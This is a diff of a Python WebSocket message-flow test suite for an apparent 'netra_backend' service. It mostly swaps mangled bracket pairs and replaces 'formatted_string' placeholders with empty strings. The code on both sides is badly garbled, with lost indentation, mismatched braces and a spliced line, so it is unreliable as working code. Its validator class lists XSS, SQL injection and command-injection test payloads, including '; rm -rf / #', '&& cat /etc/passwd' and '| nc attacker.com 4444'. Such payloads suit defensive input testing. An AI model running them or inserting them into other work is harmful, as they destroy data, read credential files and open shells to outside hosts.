@@ -119,7 +119,7 @@ class MessageFlowTestData:
     @classmethod
     def get_all_test_cases(cls) -> List[MessageTestCase]:
         """Get all message test cases."""
-        return [ )
+        return [ ]
     # Text messages
         MessageTestCase( )
         MessageType.TEXT_SIMPLE,
@@ -384,27 +384,27 @@ class MessageFlowTestData:
         @staticmethod
     def _generate_complex_json() -> Dict[str, Any]:
         """Generate complex JSON structure."""
-        return { )
-        "user": { )
+        return { }
+        "user": { }
         "id": str(uuid.uuid4()),
         "name": "Test User",
-        "preferences": { )
+        "preferences": { }
         "theme": "dark",
         "language": "en",
-        "notifications": { )
+        "notifications": { }
         "email": True,
         "push": False,
         "sms": True
     
     
         },
-        "session": { )
+        "session": { }
         "id": str(uuid.uuid4()),
         "created_at": datetime.now().isoformat(),
         "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
         "permissions": ["read", "write", "execute"]
         },
-        "metadata": { )
+        "metadata": { }
         "version": "1.0.0",
         "client": "test-client",
         "features": ["websockets", "compression", "encryption"]
@@ -416,21 +416,21 @@ class MessageFlowTestData:
         """Generate deeply nested JSON structure."""
     def create_nested_dict(depth: int) -> Dict[str, Any]:
         if depth <= 0:
-        return {"value": "formatted_string", "items": list(range(5))}
-        return { )
+        return {"value": "", "items": list(range(5))}
+        return { }
         "level": depth,
         "nested": create_nested_dict(depth - 1),
-        "siblings": [{"id": i, "data": "formatted_string"} for i in range(3)]
+        "siblings": [{"id": i, "data": ""} for i in range(3)]
         
 
-        return { )
+        return { }
         "root": create_nested_dict(8),
-        "parallel_structures": { )
+        "parallel_structures": { }
         "tree_a": create_nested_dict(5),
         "tree_b": create_nested_dict(5),
         "tree_c": create_nested_dict(5)
         },
-        "arrays": [ )
+        "arrays": [ ]
         [1, 2, [3, 4, [5, 6, [7, 8]]]],
         ["a", "b", ["c", "d", ["e", "f"]]]
         
@@ -453,7 +453,7 @@ class MessageFlowTestData:
         ```
 
         ```javascript
-        function greet(name) { )
+        function greet(name) { }
         console.log(`Hello, ${name}!`);
     
         ```
@@ -509,18 +509,18 @@ class MessageProcessor:
         try:
         message_type = message.get("type")
         if message_type not in self.processors:
-        raise ValueError("formatted_string")
+        raise ValueError("")
 
         processor = self.processors[message_type]
         result = await processor(message)
 
-        return { )
+        return { }
         "status": "success",
         "result": result,
         "processed_at": time.time()
             
         except Exception as e:
-        return { )
+        return { }
         "status": "error",
         "error": str(e),
         "processed_at": time.time()
@@ -536,25 +536,25 @@ class MessageProcessor:
     def _generate_javascript_code() -> str:
         """Generate JavaScript code sample."""
         return '''
-        class WebSocketMessageHandler { )
-        constructor(config = {}) { )
+        class WebSocketMessageHandler { }
+        constructor(config = {}) { }
         this.config = config;
         this.handlers = new Map();
         this.messageQueue = [];
 
 
-        registerHandler(messageType, handler) { )
-        if (typeof handler !== 'function') { )
+        registerHandler(messageType, handler) { }
+        if (typeof handler !== 'function') { }
         throw new Error('Handler must be a function');
 
         this.handlers.set(messageType, handler);
 
 
-        async processMessage(message) { )
-        try { )
+        async processMessage(message) { }
+        try { }
         const { type, payload } = message;
 
-        if (!this.handlers.has(type)) { )
+        if (!this.handlers.has(type)) { }
         throw new Error(`No handler for message type: ${type}`);
 
 
@@ -578,20 +578,20 @@ timestamp: Date.now()
 
 
 // Queue message for batch processing
-queueMessage(message) { )
-this.messageQueue.push({ ))
+queueMessage(message) { }
+this.messageQueue.push({ })
 passmessage,
 queuedAt: Date.now()
 });
 
 
-async processBatch() { )
+async processBatch() { }
 const batch = this.messageQueue.splice(0);
 # Removed problematic line: const results = await Promise.allSettled( )
 batch.map(msg => this.processMessage(msg))
 );
 
-return results.map((result, index) => ({ )))
+return results.map((result, index) => ({ }))
 message: batch[index],
 result: result.status === 'fulfilled' ? result.value : result.reason
 }));
@@ -663,13 +663,13 @@ def _generate_binary_reference() -> Dict[str, str]:
 binary_data = bytes([i % 256 for i in range(1000)])
 encoded_data = base64.b64encode(binary_data).decode('utf-8')
 
-return { )
+return { }
 "type": "binary_reference",
 "encoding": "base64",
 "data": encoded_data,
 "size": len(binary_data),
 "checksum": str(hash(binary_data)),
-"metadata": { )
+"metadata": { }
 "mime_type": "application/octet-stream",
 "filename": "test_data.bin",
 "created_at": datetime.now().isoformat()
@@ -679,12 +679,12 @@ return { )
 @staticmethod
 def _generate_streaming_chunk() -> Dict[str, Any]:
 """Generate streaming chunk data."""
-return { )
+return { }
 "chunk_id": str(uuid.uuid4()),
 "sequence": random.randint(1, 100),
 "total_chunks": 100,
-"data": "formatted_string",
-"checksum": str(hash("formatted_string")),
+"data": "",
+"checksum": str(hash("")),
 "is_final": False,
 "stream_id": str(uuid.uuid4())
     
@@ -694,13 +694,13 @@ def _generate_batch_messages() -> List[Dict[str, Any]]:
 """Generate batch of messages."""
 messages = []
 for i in range(10):
-messages.append({ ))
+messages.append({ })
 "id": str(uuid.uuid4()),
-"type": "formatted_string",
-"content": "formatted_string",
+"type": "",
+"content": "",
 "timestamp": datetime.now().isoformat(),
 "priority": random.choice(["low", "medium", "high"]),
-"metadata": { )
+"metadata": { }
 "batch_id": "test_batch_001",
 "sequence": i,
 "correlation_id": str(uuid.uuid4())
@@ -711,20 +711,20 @@ return messages
 @staticmethod
 def _generate_complex_command() -> Dict[str, Any]:
 """Generate complex command."""
-return { )
+return { }
 "command": "execute_agent_workflow",
-"args": { )
+"args": { }
 "workflow_id": str(uuid.uuid4()),
-"parameters": { )
+"parameters": { }
 "input_data": {"query": "test query", "context": "test context"},
-"options": { )
+"options": { }
 "timeout": 30000,
 "retry_count": 3,
 "parallel": True,
 "cache": True
     
 },
-"callbacks": [ )
+"callbacks": [ ]
 {"event": "started", "url": "https://example.com/webhook/started"},
 {"event": "completed", "url": "https://example.com/webhook/completed"}
     
@@ -732,7 +732,7 @@ return { )
 "user_id": "test_user_123",
 "session_id": str(uuid.uuid4()),
 "permissions": ["workflow.execute", "webhook.notify"],
-"metadata": { )
+"metadata": { }
 "client_version": "1.0.0",
 "user_agent": "TestClient/1.0",
 "request_id": str(uuid.uuid4())
@@ -742,11 +742,11 @@ return { )
 @staticmethod
 def _generate_system_status() -> Dict[str, Any]:
 """Generate system status message."""
-return { )
+return { }
 "system": "netra_backend",
 "status": "healthy",
 "timestamp": datetime.now().isoformat(),
-"metrics": { )
+"metrics": { }
 "cpu_usage": random.uniform(10, 80),
 "memory_usage": random.uniform(30, 90),
 "disk_usage": random.uniform(20, 70),
@@ -754,13 +754,13 @@ return { )
 "messages_per_second": random.randint(10, 1000),
 "error_rate": random.uniform(0, 5)
 },
-"services": { )
+"services": { }
 "websocket_manager": {"status": "running", "connections": 45},
 "agent_registry": {"status": "running", "agents": 12},
 "tool_dispatcher": {"status": "running", "queue_size": 3},
 "llm_manager": {"status": "running", "requests_pending": 8}
 },
-"alerts": [ )
+"alerts": [ ]
 {"level": "info", "message": "System running normally"},
 {"level": "warning", "message": "High CPU usage detected"}
     
@@ -769,13 +769,13 @@ return { )
 @staticmethod
 def _generate_debug_message() -> Dict[str, Any]:
 """Generate debug message with potential sensitive data."""
-return { )
+return { }
 "level": "debug",
 "module": "websocket_manager",
 "function": "process_message",
 "line": 245,
 "message": "Processing message with validation",
-"variables": { )
+"variables": { }
 "message_id": str(uuid.uuid4()),
 "user_id": "user_123",  # Potentially sensitive
 "connection_id": "conn_456",
@@ -783,12 +783,12 @@ return { )
 "payload_size": 1024,
 "processing_time_ms": 45.2
 },
-"stack_trace": [ )
+"stack_trace": [ ]
 "websocket_manager.py:245 in process_message",
 "message_validator.py:67 in validate",
 "schema_validator.py:89 in check_schema"
 ],
-"context": { )
+"context": { }
 "thread_id": threading.current_thread().ident,
 "timestamp": time.time(),
 "session_data": {"key": "potentially_sensitive_value"}
@@ -798,30 +798,30 @@ return { )
 @staticmethod
 def _generate_agent_request() -> Dict[str, Any]:
 """Generate agent request message."""
-return { )
+return { }
 "type": "agent_request",
 "agent_type": "research_agent",
 "request_id": str(uuid.uuid4()),
 "user_id": "test_user",
 "thread_id": str(uuid.uuid4()),
-"task": { )
+"task": { }
 "instruction": "Research the latest developments in WebSocket technology",
 "context": "User is building a real-time application",
-"constraints": { )
+"constraints": { }
 "max_time_seconds": 300,
 "max_tokens": 2000,
 "sources": ["web", "documentation", "papers"]
     
 },
-"preferences": { )
+"preferences": { }
 "detail_level": "comprehensive",
 "format": "markdown",
 "include_sources": True
 },
-"metadata": { )
+"metadata": { }
 "priority": "high",
 "estimated_complexity": "medium",
-"user_context": { )
+"user_context": { }
 "expertise_level": "intermediate",
 "preferred_language": "en"
     
@@ -831,12 +831,12 @@ return { )
 @staticmethod
 def _generate_agent_response() -> Dict[str, Any]:
 """Generate agent response message."""
-return { )
+return { }
 "type": "agent_response",
 "request_id": str(uuid.uuid4()),
 "agent_type": "research_agent",
 "status": "completed",
-"response": { )
+"response": { }
 "summary": "WebSocket technology has evolved significantly with HTTP/3 and WebRTC integration.",
 "content": "# WebSocket Technology Developments
 
@@ -862,19 +862,19 @@ return { )
 - Backward compatibility maintained
 - Progressive enhancement strategies
 - Security considerations for new features",
-"sources": [ )
+"sources": [ ]
 {"title": "WebSocket Protocol RFC 6455", "url": "https://tools.ietf.org/rfc/rfc6455.txt"},
 {"title": "HTTP/3 and WebSockets", "url": "https://example.com/http3-websockets"},
 {"title": "WebRTC Integration Guide", "url": "https://example.com/webrtc-guide"}
     
 },
-"metrics": { )
+"metrics": { }
 "processing_time_ms": 2345.6,
 "tokens_used": 1567,
 "sources_consulted": 15,
 "confidence_score": 0.92
 },
-"metadata": { )
+"metadata": { }
 "completion_timestamp": datetime.now().isoformat(),
 "model_version": "research-agent-v2.1",
 "quality_score": 0.95
@@ -884,33 +884,33 @@ return { )
 @staticmethod
 def _generate_tool_execution() -> Dict[str, Any]:
 """Generate tool execution message."""
-return { )
+return { }
 "type": "tool_execution",
 "tool_name": "web_search",
 "execution_id": str(uuid.uuid4()),
-"request": { )
+"request": { }
 "action": "search",
-"parameters": { )
+"parameters": { }
 "query": "WebSocket performance optimization",
 "max_results": 10,
 "include_snippets": True,
 "date_filter": "recent"
 },
-"context": { )
+"context": { }
 "user_intent": "research",
 "domain": "technology"
     
 },
-"response": { )
+"response": { }
 "status": "success",
-"results": [ )
-{ )
+"results": [ ]
+{ }
 "title": "WebSocket Performance Best Practices",
 "url": "https://example.com/websocket-performance",
 "snippet": "Optimizing WebSocket connections for high-performance applications...",
 "relevance_score": 0.95
 },
-{ )
+{ }
 "title": "Scaling WebSocket Applications",
 "url": "https://example.com/scaling-websockets",
 "snippet": "Techniques for handling thousands of concurrent WebSocket connections...",
@@ -920,11 +920,11 @@ return { )
 "total_results": 10,
 "search_time_ms": 234.5
 },
-"execution_metrics": { )
+"execution_metrics": { }
 "start_time": datetime.now().isoformat(),
 "end_time": (datetime.now() + timedelta(milliseconds=500)).isoformat(),
 "duration_ms": 500.0,
-"resource_usage": { )
+"resource_usage": { }
 "cpu_time_ms": 45.2,
 "memory_mb": 12.8,
 "network_requests": 3
@@ -935,27 +935,27 @@ return { )
 @staticmethod
 def _generate_metrics_data() -> Dict[str, Any]:
 """Generate metrics data."""
-return { )
+return { }
 "type": "metrics",
 "service": "websocket_manager",
 "timestamp": datetime.now().isoformat(),
 "interval_seconds": 60,
-"metrics": { )
-"connections": { )
+"metrics": { }
+"connections": { }
 "total": 145,
 "active": 132,
 "idle": 13,
 "connecting": 2,
 "disconnecting": 1
 },
-"messages": { )
+"messages": { }
 "sent": 5439,
 "received": 5124,
 "queued": 23,
 "failed": 12,
 "retried": 8
 },
-"performance": { )
+"performance": { }
 "avg_latency_ms": 45.6,
 "p95_latency_ms": 89.2,
 "p99_latency_ms": 156.7,
@@ -963,7 +963,7 @@ return { )
 "cpu_usage_percent": 34.2,
 "memory_usage_mb": 89.6
 },
-"errors": { )
+"errors": { }
 "connection_errors": 3,
 "message_validation_errors": 2,
 "timeout_errors": 1,
@@ -971,8 +971,8 @@ return { )
 "rate_limit_errors": 1
     
 },
-"alerts": [ )
-{ )
+"alerts": [ ]
+{ }
 "level": "warning",
 "metric": "p99_latency_ms",
 "threshold": 150.0,
@@ -985,25 +985,25 @@ return { )
 @staticmethod
 def _generate_event_notification() -> Dict[str, Any]:
 """Generate event notification."""
-return { )
+return { }
 "type": "event_notification",
 "event_id": str(uuid.uuid4()),
 "event_type": "agent_completed",
 "source": "agent_registry",
 "timestamp": datetime.now().isoformat(),
-"payload": { )
+"payload": { }
 "agent_id": "research_agent_001",
 "request_id": str(uuid.uuid4()),
 "status": "success",
 "duration_ms": 5432.1,
 "result_summary": "Research task completed successfully"
 },
-"routing": { )
+"routing": { }
 "targets": ["websocket_notifier", "metrics_collector", "audit_logger"],
 "priority": "normal",
 "delivery_mode": "broadcast"
 },
-"metadata": { )
+"metadata": { }
 "correlation_id": str(uuid.uuid4()),
 "causation_id": str(uuid.uuid4()),
 "version": "1.0",
@@ -1015,7 +1015,7 @@ return { )
 def _generate_compressible_data() -> str:
 """Generate highly compressible data for compression testing."""
     # Create highly repetitive data that compresses well
-patterns = [ )
+patterns = [ ]
 "The quick brown fox jumps over the lazy dog. ",
 "Lorem ipsum dolor sit amet, consectetur adipiscing elit. ",
 "WebSocket message flow testing with compression validation. ",
@@ -1065,7 +1065,7 @@ class MessageFlowValidator:
 
     def __init__(self):
         pass
-        self.corruption_detectors = { )
+        self.corruption_detectors = { }
         "truncation": self._detect_truncation,
         "encoding": self._detect_encoding_corruption,
         "malformed_json": self._create_malformed_json,
@@ -1083,7 +1083,7 @@ class MessageFlowValidator:
         """Test message truncation scenarios."""
         if isinstance(message, str):
         # Truncate at various points
-        return { )
+        return { }
         "original": message,
         "truncated_50": message[:len(message)//2],
         "truncated_90": message[:int(len(message)*0.9)],
@@ -1110,14 +1110,14 @@ class MessageFlowValidator:
 
         return corrupted_tests
         except Exception as e:
-        return {"error": "formatted_string"}
+        return {"error": ""}
         return {"error": "Cannot test encoding on non-string message"}
 
     def _create_malformed_json(self, message: Any) -> Dict[str, Any]:
         """Create malformed JSON variations."""
         if isinstance(message, dict):
         json_str = json.dumps(message)
-        return { )
+        return { }
         "missing_quote": json_str.replace('"type"', 'type'),
         "missing_comma": json_str.replace('", "', '" "'),
         "unclosed_brace": json_str[:-1],
@@ -1128,7 +1128,7 @@ class MessageFlowValidator:
 
     def _detect_injection_attempt(self, message: Any) -> Dict[str, Any]:
         """Test various injection scenarios."""
-        injection_payloads = { )
+        injection_payloads = { }
         "script_injection": "<script>alert('xss')</script>",
         "sql_injection": ""; DROP TABLE messages; --",
         "command_injection": "; rm -rf / #",
@@ -1157,8 +1157,8 @@ class MessageFlowValidator:
         overflow_sizes = [1024*1024, 10*1024*1024, 100*1024*1024]  # 1MB, 10MB, 100MB
 
         if isinstance(message, str):
-        return { )
-        "formatted_string": message + "A" * size
+        return { }
+        "": message + "A" * size
         for size in overflow_sizes
         
         elif isinstance(message, dict):
@@ -1171,7 +1171,7 @@ class MessageFlowValidator:
 
     def _create_xss_payload(self, message: Any) -> Dict[str, Any]:
         """Create XSS test payloads."""
-        xss_payloads = [ )
+        xss_payloads = [ ]
         "<script>alert('xss')</script>",
         "<img src=x onerror=alert('xss')>",
         "javascript:alert('xss')",
@@ -1180,20 +1180,20 @@ class MessageFlowValidator:
     
 
         if isinstance(message, str):
-        return {"formatted_string": message + payload for i, payload in enumerate(xss_payloads)}
+        return {"": message + payload for i, payload in enumerate(xss_payloads)}
         elif isinstance(message, dict):
         corrupted = {}
         for i, payload in enumerate(xss_payloads):
         test_message = message.copy()
-        test_message["formatted_string"] = payload
-        corrupted["formatted_string"] = test_message
+        test_message[""] = payload
+        corrupted[""] = test_message
         return corrupted
 
         return {"error": "Cannot create XSS payload for this message type"}
 
     def _create_sql_injection(self, message: Any) -> Dict[str, Any]:
         """Create SQL injection test payloads."""
-        sql_payloads = [ )
+        sql_payloads = [ ]
         ""; DROP TABLE messages; --",
         "" OR "1"="1" --",
         ""; INSERT INTO logs VALUES ("injected"); --",
@@ -1202,7 +1202,7 @@ class MessageFlowValidator:
     
 
         if isinstance(message, str):
-        return {"formatted_string": message + payload for i, payload in enumerate(sql_payloads)}
+        return {"": message + payload for i, payload in enumerate(sql_payloads)}
         elif isinstance(message, dict):
         corrupted = {}
         for i, payload in enumerate(sql_payloads):
@@ -1212,14 +1212,14 @@ class MessageFlowValidator:
         if isinstance(value, str):
         test_message[key] = value + payload
         break
-        corrupted["formatted_string"] = test_message
+        corrupted[""] = test_message
         return corrupted
 
         return {"error": "Cannot create SQL injection for this message type"}
 
     def _create_command_injection(self, message: Any) -> Dict[str, Any]:
         """Create command injection test payloads."""
-        cmd_payloads = [ )
+        cmd_payloads = [ ]
         "; ls -la",
         "&& cat /etc/passwd",
         "| nc attacker.com 4444",
@@ -1228,7 +1228,7 @@ class MessageFlowValidator:
     
 
         if isinstance(message, str):
-        return {"formatted_string": message + payload for i, payload in enumerate(cmd_payloads)}
+        return {"": message + payload for i, payload in enumerate(cmd_payloads)}
         elif isinstance(message, dict):
         corrupted = {}
         for i, payload in enumerate(cmd_payloads):
@@ -1240,7 +1240,7 @@ class MessageFlowValidator:
         test_message["args"].append(payload)
         else:
         test_message["args"] = str(test_message["args"]) + payload
-        corrupted["formatted_string"] = test_message
+        corrupted[""] = test_message
         return corrupted
 
         return {"error": "Cannot create command injection for this message type"}
@@ -1318,9 +1318,9 @@ class ComprehensiveMessageFlowTester:
         services = ["backend", "auth", "redis", "postgres"]
         try:
         await self.docker_manager.start_services_smart(services)
-        logger.info("formatted_string")
+        logger.info("")
         except Exception as e:
-        logger.warning("formatted_string")
+        logger.warning("")
 
             # Wait for services to be ready
         max_retries = 30
@@ -1330,7 +1330,7 @@ class ComprehensiveMessageFlowTester:
         logger.info("All real services are available")
         break
         except Exception as e:
-        logger.debug("formatted_string")
+        logger.debug("")
         if retry < max_retries - 1:
         await asyncio.sleep(2)
         else:
@@ -1347,11 +1347,11 @@ class ComprehensiveMessageFlowTester:
         await self.docker_manager.cleanup_services()
         logger.info("Cleaned up real services")
         except Exception as e:
-        logger.warning("formatted_string")
+        logger.warning("")
 
     async def test_message_flow(self, test_case:
         """Test complete message flow through the stack."""
-        logger.info("formatted_string")
+        logger.info("")
 
         start_time = time.time()
         errors = []
@@ -1366,9 +1366,9 @@ class ComprehensiveMessageFlowTester:
         try:
         serialized_message = await self._serialize_message(test_case.content)
         transformations_applied.append("serialization")
-        logger.debug("formatted_string")
+        logger.debug("")
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
         serialized_message = test_case.content
         serialization_time = (time.time() - serialization_start) * 1000
 
@@ -1377,9 +1377,9 @@ class ComprehensiveMessageFlowTester:
         try:
         frame_data = await self._create_websocket_frame(serialized_message)
         transformations_applied.append("websocket_frame")
-        logger.debug("formatted_string")
+        logger.debug("")
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
         frame_data = serialized_message
 
                                         # 3. Stack Flow Simulation (Frontend  ->  Backend  ->  WebSocket  ->  Agent  ->  Tool)
@@ -1389,7 +1389,7 @@ class ComprehensiveMessageFlowTester:
         if flow_result.get("errors"):
         errors.extend(flow_result["errors"])
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
 
         network_time = (time.time() - websocket_start) * 1000
 
@@ -1400,9 +1400,9 @@ class ComprehensiveMessageFlowTester:
         compression_result = await self._test_compression(serialized_message)
         compressed_size = compression_result.get("compressed_size")
         transformations_applied.append("compression")
-        logger.debug("formatted_string")
+        logger.debug("")
         except Exception as e:
-        warnings.append("formatted_string")
+        warnings.append("")
 
                                                                 # 5. Corruption Detection Tests
         for corruption_test in test_case.corruption_tests:
@@ -1416,7 +1416,7 @@ class ComprehensiveMessageFlowTester:
         corruption_tests_failed.append(corruption_test)
         except Exception as e:
         corruption_tests_failed.append(corruption_test)
-        warnings.append("formatted_string")
+        warnings.append("")
 
                                                                                     # 6. Persistence Testing (if required)
         if test_case.persistence_required:
@@ -1427,7 +1427,7 @@ class ComprehensiveMessageFlowTester:
         else:
         warnings.append("Persistence test failed")
         except Exception as e:
-        warnings.append("formatted_string")
+        warnings.append("")
 
         total_time = (time.time() - start_time) * 1000
 
@@ -1464,7 +1464,7 @@ class ComprehensiveMessageFlowTester:
                                                                                                         
 
         except Exception as e:
-        logger.error("formatted_string")
+        logger.error("")
                                                                                                             # Return failed result
         return MessageFlowResult( )
         test_case=test_case,
@@ -1488,7 +1488,7 @@ class ComprehensiveMessageFlowTester:
         if self.websocket_manager:
         try:
                 # Create test connection
-        test_user = "formatted_string"
+        test_user = ""
 
                 # Test sending through WebSocket manager (this will test the real stack)
         websocket_message = WebSocketMessage( )
@@ -1507,7 +1507,7 @@ class ComprehensiveMessageFlowTester:
         errors.append("WebSocket manager send failed")
 
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
 
                             # Simulate agent processing (if applicable)
         if "agent" in test_case.message_type.value:
@@ -1534,7 +1534,7 @@ class ComprehensiveMessageFlowTester:
         transformations.append("agent_processing")
 
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
 
                                                     # Simulate tool execution (if applicable)
         if "tool" in test_case.message_type.value:
@@ -1544,12 +1544,12 @@ class ComprehensiveMessageFlowTester:
         transformations.append("tool_routing")
 
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
 
         except Exception as e:
-        errors.append("formatted_string")
+        errors.append("")
 
-        return { )
+        return { }
         "transformations": transformations,
         "errors": errors
                                                                     
@@ -1573,7 +1573,7 @@ class ComprehensiveMessageFlowTester:
         # Verify integrity
         integrity_check = message == decompressed_message
 
-        return { )
+        return { }
         "original_size": original_size,
         "compressed_size": compressed_size,
         "compression_ratio": compressed_size / original_size if original_size > 0 else 1.0,
@@ -1581,13 +1581,13 @@ class ComprehensiveMessageFlowTester:
         
 
         except Exception as e:
-        return {"error": "formatted_string"}
+        return {"error": ""}
 
     async def _test_corruption_detection(self, message: Dict[str, Any], corruption_type: str) -> Dict[str, Any]:
         """Test corruption detection for a specific corruption type."""
         try:
         if corruption_type not in self.validator.corruption_detectors:
-        return {"error": "formatted_string"}
+        return {"error": ""}
 
         detector = self.validator.corruption_detectors[corruption_type]
         corruption_result = detector(message)
@@ -1596,14 +1596,14 @@ class ComprehensiveMessageFlowTester:
             # successfully generated test cases without errors
         detected = "error" not in corruption_result
 
-        return { )
+        return { }
         "detected": detected,
         "corruption_variants": len(corruption_result) if detected else 0,
         "details": corruption_result
             
 
         except Exception as e:
-        return {"error": "formatted_string", "detected": False}
+        return {"error": "", "detected": False}
 
     async def _test_persistence(self, message: Dict[str, Any], test_case: MessageTestCase) -> Dict[str, Any]:
         """Test message persistence capabilities."""
@@ -1613,7 +1613,7 @@ class ComprehensiveMessageFlowTester:
 
         # Simulate storage
         message_id = str(uuid.uuid4())
-        storage_key = "formatted_string"
+        storage_key = ""
 
         # Simulate serialization for storage
         serialized_for_storage = json.dumps(message)
@@ -1624,7 +1624,7 @@ class ComprehensiveMessageFlowTester:
         # Verify integrity
         integrity_check = message == retrieved_message
 
-        return { )
+        return { }
         "success": integrity_check,
         "message_id": message_id,
         "storage_size": len(serialized_for_storage),
@@ -1632,7 +1632,7 @@ class ComprehensiveMessageFlowTester:
         
 
         except Exception as e:
-        return {"error": "formatted_string", "success": False}
+        return {"error": "", "success": False}
 
     async def run_comprehensive_tests(self) -> Dict[str, Any]:
         """Run comprehensive message flow tests for all message types."""
@@ -1653,7 +1653,7 @@ class ComprehensiveMessageFlowTester:
             # Run tests by size category (small first, then larger)
         for category in ["small", "medium", "large", "xlarge"]:
         if category in size_categories:
-        logger.info("formatted_string")
+        logger.info("")
 
                     # Run tests in this category
         category_results = []
@@ -1664,12 +1664,12 @@ class ComprehensiveMessageFlowTester:
         results.append(result)
 
         if result.success:
-        logger.info("formatted_string")
+        logger.info("")
         else:
-        logger.warning("formatted_string")
+        logger.warning("")
 
         except Exception as e:
-        logger.error("formatted_string")
+        logger.error("")
                                         # Create failed result
         failed_result = MessageFlowResult( )
         test_case=test_case,
@@ -1677,16 +1677,16 @@ class ComprehensiveMessageFlowTester:
         metrics=MessageFlowMetrics( )
         processing_time_ms=float('inf'),
         e2e_delivery_time_ms=float('in'formatted_string'performance_metrics']['performance_requirements']
-        print("formatted_string")
-        print("formatted_string")
-        print("formatted_string")
+        print("")
+        print("")
+        print("")
 
-        print(" )
+        print("")
         Size Category Analysis:")
         for category, stats in summary['size_category_analysis'].items():
         success_rate = stats['successful'] / stats['total'] if stats['total'] > 0 else 0
-        print("formatted_string" )
-        "formatted_string")
+        print("" )
+        "")
 
             # Overall assessment
         overall_success = ( )
@@ -1695,7 +1695,7 @@ class ComprehensiveMessageFlowTester:
         summary['performance_metrics']['avg_e2e_delivery_time_ms'] < 1000
             
 
-        print("formatted_string")
+        print("")
         print("=" * 80)
 
         await asyncio.sleep(0)
